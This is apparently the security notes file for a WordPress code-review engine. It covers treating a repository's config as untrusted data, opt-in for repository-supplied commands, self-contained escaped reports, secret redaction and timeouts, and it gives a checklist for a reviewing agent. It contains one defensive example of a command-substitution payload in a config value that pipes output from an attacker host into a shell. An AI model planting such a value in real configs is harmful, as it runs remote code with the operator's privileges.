# Security notes

Two separate concerns live here: the security of the engine itself, and the
security review the engine supports.

## 1. The engine's own threat model

**A repository under review is untrusted input.** You may be auditing a client
handoff, a contractor's branch, or a plugin you have never read. The engine is
built on that assumption.

### Configuration is data, never code

`bin/config-loader.py` emits NUL-delimited `KEY=VALUE` pairs (`--format env0`).
The runner reads them in a loop, validates each name against
`^WPHEKA_(CHECK|CMD|TIMEOUT|CFG)_[A-Z0-9_]+$`, and exports the value verbatim.
Nothing from a config file is ever passed to `eval`.

This matters because a config value that reaches `eval` executes immediately.
`commands: {phpcs: "$(curl attacker.tld|sh)"}` would run at config-load time,
before any check started, on a repository the operator had only asked to *read*.

### Repository-supplied commands need opt-in

A `commands:` block is a shell command line, so honouring one from the target
repository means running code that repository authored.

| Source of the `commands:` block | Honoured by default |
|---|---|
| Bundled profile in `config/profiles/` | Yes |
| File passed with `--config` | Yes — the operator chose it |
| `.wpheka-quality.yml` inside the target repo | **No** |

Pass `--allow-repo-commands` for the last case. It is the right flag for your
own repositories and the wrong flag for code you have not read. When a block is
ignored, the run prints a warning rather than failing silently.

### Overrides run verbatim

A configured command is executed exactly as written; the engine appends
nothing. Two variables are exported for it:

- `WPHEKA_RAW_DIR` — where to write a machine-readable report
- `WPHEKA_CHECK_NAME` — the check being run

To keep structured findings when overriding phpcs, write the JSON report
yourself:

```yaml
commands:
  phpcs: "vendor/bin/phpcs -q --report-full --report-json=$WPHEKA_RAW_DIR/phpcs.json ."
```

### Reports are shareable artifacts

`report.html` is self-contained and makes **no network requests** — no CDN
fonts, no remote scripts. It can be opened on an air-gapped machine and cannot
phone home about what was scanned.

Tool output embedded in the page is escaped so it cannot execute. `json.dumps`
alone does not escape `</script>`, so a log containing that string would close
the script block and let the remainder run as markup; the renderer escapes
`<`, `>` and `&` to their `\u00XX` forms.

Gitleaks findings deliberately carry the rule description and location only.
The `Secret` value is never copied into any artifact, so a report can be
attached to a ticket without leaking the credential it found.

### Bounded execution

Every check runs under a timeout (`timeouts:` in config, `--list-checks` to see
the resolved values). On expiry the check process and its direct children are
signalled — `TERM`, then `KILL` — and the check is recorded as `TIMEOUT`, a
status distinct from `FAIL`, because a check that never finished proves nothing
either way. A tool that daemonises beyond its direct children can still outlive
the signal; the check is recorded as `TIMEOUT` regardless.

### Known limits

- Checks execute the tools themselves; a compromised `vendor/bin/phpcs` in the
  target repository runs with your privileges. Review vendored binaries, or run
  the engine in a container.
- npm `lint`/`test` execute repository-authored scripts and are opt-in for that
  reason. They are additionally skipped when `node_modules` is absent, since the
  engine never installs dependencies.
- The engine reads and reports. It does not fix, commit, push or deploy.

## 2. What the security review should prioritise

For the reviewing agent, in rough order of consequence:

1. authentication and authorization
2. capability checks
3. nonce verification
4. input validation and sanitization
5. output escaping
6. SQL injection
7. XSS
8. SSRF
9. arbitrary file operations
10. unsafe deserialization
11. command execution
12. path traversal
13. secret leakage
14. webhook authentication
15. insecure logging

A scanner result is a lead, not a conclusion. Verify reachability and
exploitability against the actual source before classifying anything as a
confirmed vulnerability, and say so explicitly when you could not.
